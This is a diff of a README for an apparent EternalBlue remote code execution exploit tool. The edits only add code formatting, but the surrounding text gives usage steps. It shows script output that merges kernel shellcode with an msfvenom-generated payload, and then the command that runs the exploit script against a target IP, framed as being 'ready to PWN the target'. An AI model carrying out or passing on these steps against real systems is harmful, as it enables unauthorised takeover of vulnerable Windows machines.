@@ -39,6 +39,7 @@ Navigate to the `shellcode` directory in the repo:
 run ./shell_prep.sh
 
 OUTPUT:
+```
                  _.-;;-._
           '-..-'|   ||   |
           '-..-'|_.-;;-._|
@@ -66,13 +67,14 @@ Payload for x64 generated.
 MERGING KERNEL SHELLCODE WITH MSFVENOM-GENERATED PAYLOAD!
 Shellcode merged successfully.
 DONE
+```
 
 ## PWN:
 If you have completed the USAGE steps, now you're ready to PWN the target.
 
 navigate back to Eternal-Blue-with-RCE directory
 
-run: python3 eternalblue_exploit10.py <TARGET-IP> shellcode/sc_x64.bin <Number of Groom Connections (optional)>
+run: `python3 eternalblue_exploit10.py <TARGET-IP> shellcode/sc_x64.bin <Number of Groom Connections (optional)>`
 
 
 
